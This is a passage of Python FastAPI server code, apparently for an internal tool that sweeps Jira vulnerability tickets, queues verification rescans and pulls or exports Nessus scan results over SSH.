        "queued_manual": queued_manual,
        "skipped_queued": skipped_queued,
        "by_rule": by_rule,
        "is_partial": False,
        "sample_size": len(tickets),
    }


@app.post("/api/sweep/{label}/run")
def sweep_run(label: str, body: Optional[SweepRunRequest] = None):
    client_cfg, client_session = _get_client(label)
    if not client_cfg:
        raise HTTPException(400, f"Unknown client: {label}")
    from .vuln_rules import match_rule
    filter_set = set(body.filter_rules) if (body and body.filter_rules) else None
    jira_client = _jira_for_label(label)

    def _do():
        scanner._app_log(f"[Sweep] {label}: fetching all open tickets…")
        try:
            tickets = jira_client.get_sweep_tickets(label)
        except Exception as exc:
            scanner._app_log(f"[Sweep] {label}: fetch failed — {exc}")
            return
        queued = queued_manual = 0
        for ticket in tickets:
            key = ticket["key"]
            if key in scanner.SEEN_KEYS:
                continue
            rule = match_rule(ticket["summary"])
            # Apply rule filter (only relevant to auto-scan tickets)
            if filter_set and rule and rule.name not in filter_set:
                continue
            scanner.SEEN_KEYS.add(key)
            is_manual = rule is None
            job_id = scanner._queue_ticket(ticket, label, source="sweep", manual=is_manual, session=client_session, cfg=cfg)
            if is_manual:
                scanner._app_log(
                    f"Sweep (manual): {key} ({label}) — no matching rule"
                )
                queued_manual += 1
            else:
                scanner._app_log(
                    f"Sweep: {key} ({label}) | "
                    f"IP: {scanner.JOBS[job_id].get('ip')} | Rule: {rule.name}"
                )
                queued += 1
        scanner._app_log(
            f"[Sweep] {label}: done — {queued} auto-scan + {queued_manual} manual review ticket(s) queued"
        )

    threading.Thread(target=_do, daemon=True).start()
    return {"ok": True}

class SweepStartRequest(BaseModel):
    job_ids: List[str]

@app.post("/api/sweep/{label}/start_scan")
def sweep_start_scan(label: str, req: SweepStartRequest):
    client_cfg, _ = _get_client(label)
    if not client_cfg:
        raise HTTPException(400, f"Unknown client: {label}")
    if not connections.get_connection(label):
        raise HTTPException(400, f"SSH not connected for {label}. Please connect SSH first.")
    scanner.start_sweep(label, client_cfg, req.job_ids)
    return {"ok": True}

@app.post("/api/sweep/{label}/resume")
def sweep_resume(label: str):
    client_cfg, _ = _get_client(label)
    if not client_cfg:
        raise HTTPException(400, f"Unknown client: {label}")
    if not connections.get_connection(label):
        raise HTTPException(400, f"SSH not connected for {label}. Please connect SSH first.")
    if not scanner.resume_sweep(label, client_cfg):
        raise HTTPException(400, "Sweep is not in paused state")
    return {"ok": True}

@app.post("/api/sweep/{label}/pause")
def sweep_pause(label: str):
    scanner.pause_sweep(label)
    return {"ok": True}

@app.get("/api/sweep/{label}/status")
def sweep_status(label: str):
    with scanner._lock:
        state = scanner.SWEEPS.get(label)
        if not state:
            return {"status": "stopped", "pending_count": 0}
        return {
            "status": state.status,
            "pending_count": len(state.pending_job_ids)
        }

@app.delete("/api/sweep/jobs")
def clear_sweep_jobs():
    """Remove all non-scanning sweep jobs and allow them to be re-swept."""
    with scanner._lock:
        to_remove = [
            jid for jid, j in scanner.JOBS.items()
            if j.get("source") == "sweep" and j["status"] != "scanning"
        ]
        removed = 0
        for jid in to_remove:
            scanner.SEEN_KEYS.discard(scanner.JOBS[jid]["ticket_key"])
            del scanner.JOBS[jid]
            removed += 1
    scanner._app_log(f"Cleared {removed} sweep job(s) from queue")
    return {"ok": True, "removed": removed}

@app.delete("/api/manual/jobs")
def clear_manual_jobs():
    """Remove all non-scanning manual jobs."""
    with scanner._lock:
        to_remove = [
            jid for jid, j in scanner.JOBS.items()
            if j.get("source") == "manual" and j["status"] != "scanning"
        ]
        removed = 0
        for jid in to_remove:
            scanner.SEEN_KEYS.discard(scanner.JOBS[jid]["ticket_key"])
            del scanner.JOBS[jid]
            removed += 1
    scanner._app_log(f"Cleared {removed} manual job(s) from queue")
    return {"ok": True, "removed": removed}


@app.delete("/api/poll/jobs")
def clear_poll_jobs():
    """Remove all non-scanning remediated (Jira poll) jobs from the queue."""
    with scanner._lock:
        to_remove = [
            jid for jid, j in scanner.JOBS.items()
            if j.get("source", "poll") == "poll" and j["status"] != "scanning"
        ]
        removed = 0
        for jid in to_remove:
            scanner.SEEN_KEYS.discard(scanner.JOBS[jid]["ticket_key"])
            del scanner.JOBS[jid]
            removed += 1
    scanner._app_log(f"Cleared {removed} remediated job(s) from queue")
    return {"ok": True, "removed": removed}


# ── Assets ─────────────────────────────────────────────────────────────────

class AssetListRequest(BaseModel):
    entries: List[str]


@app.get("/api/assets/{label}")
def get_assets(label: str):
    if not _find_client(label):
        raise HTTPException(400, f"Unknown client: {label}")
    from . import assets as assets_mod
    return assets_mod.load_asset_list(label)


@app.post("/api/assets/{label}")
def save_assets(label: str, req: AssetListRequest):
    if not _find_client(label):
        raise HTTPException(400, f"Unknown client: {label}")
    from . import assets as assets_mod
    count = assets_mod.save_asset_list(label, req.entries)
    scanner._app_log(f"[Assets] {label}: saved {count} IP/subnet entries")
    return {"ok": True, "saved": count}


# ── Nessus ─────────────────────────────────────────────────────────────────

class NessusPullRequest(BaseModel):
    scan_ids: List[int]


class NessusFetchKeysRequest(BaseModel):
    username: str
    password: str


@app.post("/api/nessus/{label}/fetch-keys")
def nessus_fetch_keys(label: str, req: NessusFetchKeysRequest):
    """
    Use the Nessus username+password to auto-generate a new access/secret key
    pair via the Nessus REST API (running on Kali at localhost:8834).
    Requires an active SSH connection for this client label.
    """
    client_cfg = _find_client(label)
    if not client_cfg:
        raise HTTPException(400, f"Unknown client: {label}")
    conn = connections.get_connection(label)
    if not conn:
        raise HTTPException(
            400,
            f"SSH not connected for '{label}' — connect in the SSH panel first, then retry",
        )
    from . import nessus_client as nc
    try:
        access_key, secret_key = nc.fetch_api_keys(conn, req.username, req.password)
        return {"access_key": access_key, "secret_key": secret_key}
    except Exception as exc:
        raise HTTPException(500, str(exc))


@app.get("/api/nessus/{label}/folders")
def nessus_folders(label: str):
    client_cfg = _find_client(label)
    if not client_cfg:
        raise HTTPException(400, f"Unknown client: {label}")
    if not getattr(client_cfg, "nessus_access_key", None):
        raise HTTPException(400, f"Nessus API keys not configured for {label}")
    conn = connections.get_connection(label)
    if not conn:
        raise HTTPException(400, f"SSH not connected for '{label}' — connect in the SSH panel first")
    from . import nessus_client as nc
    try:
        folders = nc.get_folders(conn, client_cfg.nessus_access_key, client_cfg.nessus_secret_key)
        return {"folders": folders}
    except Exception as exc:
        raise HTTPException(500, str(exc))


@app.get("/api/nessus/{label}/scans")
def nessus_scans(label: str, folder_id: Optional[int] = None):
    client_cfg = _find_client(label)
    if not client_cfg:
        raise HTTPException(400, f"Unknown client: {label}")
    if not getattr(client_cfg, "nessus_access_key", None):
        raise HTTPException(400, f"Nessus API keys not configured for {label}")
    conn = connections.get_connection(label)
    if not conn:
        raise HTTPException(400, f"SSH not connected for '{label}' — connect in the SSH panel first")
    from . import nessus_client as nc
    try:
        scans = nc.get_scans(conn, client_cfg.nessus_access_key, client_cfg.nessus_secret_key, folder_id)
        return {"scans": scans}
    except Exception as exc:
        raise HTTPException(500, str(exc))


@app.post("/api/nessus/{label}/host-count")
def nessus_host_count(label: str, req: NessusPullRequest):
    """Return total host count across selected scans without pulling all data."""
    client_cfg = _find_client(label)
    if not client_cfg:
        raise HTTPException(400, f"Unknown client: {label}")
    conn = connections.get_connection(label)
    if not conn:
        raise HTTPException(400, f"SSH not connected for '{label}'")
    from . import nessus_client as nc
    total = 0
    for scan_id in req.scan_ids:
        try:
            total += nc.get_scan_host_count(
                conn, client_cfg.nessus_access_key, client_cfg.nessus_secret_key, scan_id
            )
        except Exception:
            pass
    return {"total_hosts": total}


@app.post("/api/nessus/{label}/pull")
def nessus_pull(label: str, req: NessusPullRequest):
    """Pull hosts from selected Nessus scans and cross-reference against saved asset list."""
    client_cfg = _find_client(label)
    if not client_cfg:
        raise HTTPException(400, f"Unknown client: {label}")
    if not getattr(client_cfg, "nessus_access_key", None):
        raise HTTPException(400, f"Nessus API keys not configured for {label}")
    conn = connections.get_connection(label)
    if not conn:
        raise HTTPException(400, f"SSH not connected for '{label}' — connect in the SSH panel first")
    from . import nessus_client as nc, assets as assets_mod

    all_hosts: list = []
    errors: list = []

    # Sequential fetch: large Nessus scan responses (1 MB+) can cause one channel
    # to flood the SSH transport, corrupting a parallel channel's data stream.
    # Sequential is slower but eliminates that interference entirely.
    for scan_id in req.scan_ids:
        try:
            hosts, warning = nc.get_scan_hosts(
                conn, client_cfg.nessus_access_key, client_cfg.nessus_secret_key, scan_id
            )
            all_hosts.extend(hosts)
            if warning:
                errors.append(warning)
        except Exception as exc:
            errors.append(f"Scan {scan_id}: {exc}")

    asset_data = assets_mod.load_asset_list(label)
    result = assets_mod.cross_reference(asset_data["entries"], all_hosts)
    result["total_hosts_pulled"] = len(all_hosts)
    result["errors"] = errors

    scanner._app_log(
        f"[Assets] {label}: {len(all_hosts)} hosts from {len(req.scan_ids)} scan(s) — "
        f"reachable: {result['counts']['reachable']}, "
        f"not reachable: {result['counts']['not_reachable']}, "
        f"OOS: {result['counts']['out_of_scope']}"
    )
    return result


# ── Nessus — CSV export (bulk ZIP) ───────────────────────────────────────────

class NessusExportRequest(BaseModel):
    scan_ids: List[int]


@app.post("/api/nessus/{label}/export")
def nessus_export(label: str, req: NessusExportRequest):
    """Export selected scans as CSV reports bundled into a ZIP file."""
    import io
    import re
    import zipfile

    client_cfg = _find_client(label)
    if not client_cfg:
        raise HTTPException(400, f"Unknown client: {label}")
    if not getattr(client_cfg, "nessus_access_key", None):
        raise HTTPException(400, f"Nessus API keys not configured for {label}")
    conn = connections.get_connection(label)
    if not conn:
        raise HTTPException(400, f"SSH not connected for '{label}' — connect in the SSH panel first")
    from . import nessus_client as nc

    zip_buf = io.BytesIO()
    errors = []
    succeeded = 0
    with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for scan_id in req.scan_ids:
            try:
                csv_text, scan_name = nc.export_scan_csv(
                    conn, client_cfg.nessus_access_key, client_cfg.nessus_secret_key, scan_id
                )
                safe_name = re.sub(r"[^\w\s\-]", "_", scan_name).strip() or f"scan_{scan_id}"
                zf.writestr(f"{safe_name}_{scan_id}.csv", csv_text.encode("utf-8"))
                scanner._app_log(f"[Export] {label}: exported '{scan_name}' (scan {scan_id})")
                succeeded += 1
            except Exception as exc:
                errors.append(f"Scan {scan_id}: {exc}")
                log.warning("CSV export failed for scan %s: %s", scan_id, exc)

    # Even an empty ZipFile has a non-zero EOCD record, so tell()==0 never fires.
    # Check the actual count of exported files instead.
    if succeeded == 0:
        raise HTTPException(500, "All exports failed: " + "; ".join(errors))

    zip_buf.seek(0)
    today = date.today().isoformat()
    headers = {
        "Content-Disposition": f"attachment; filename=nessus_reports_{today}.zip",
        "X-Export-Errors": str(len(errors)),
    }
    return StreamingResponse(zip_buf, media_type="application/zip", headers=headers)




# ── Force poll ─────────────────────────────────────────────────────────────

@app.post("/api/poll")
def force_poll():
    # Wake the active session's poller immediately and return — never blocks.
    if active_session == "non_axian":
        count_before = scanner._poll_count_secondary
        scanner._wake_poll_secondary.set()
    else:
        count_before = scanner._poll_count
        scanner._wake_poll.set()
    return {"ok": True, "count": count_before}


@app.get("/api/poll/status")
def poll_status():
    count = scanner._poll_count_secondary if active_session == "non_axian" else scanner._poll_count
    return {"count": count}


# ── Debug snapshot ────────────────────────────────────────────────────────

@app.get("/api/debug/state")
def debug_state():
    """Dump current in-memory state for debugging."""
    with scanner._lock:
        jobs_summary = [
            {
                "id": j["id"],
                "key": j["ticket_key"],
                "client": j["client_label"],
                "status": j["status"],
                "source": j.get("source", "poll"),
                "jira_updated": j.get("jira_updated", False),
                "verdict": j.get("verdict"),
            }
            for j in scanner.JOBS.values()
        ]
        seen = list(scanner.SEEN_KEYS)
    return {
        "poll_count": scanner._poll_count,
        "jobs_total": len(jobs_summary),
        "seen_keys_total": len(seen),
        "jobs": jobs_summary,
        "seen_keys": seen,
        "last_logs": scanner.APP_LOGS[-20:],
    }


# ── System logs ────────────────────────────────────────────────────────────

@app.get("/api/logs")
def get_logs():
    with scanner._lock:
        return scanner.APP_LOGS[-200:]
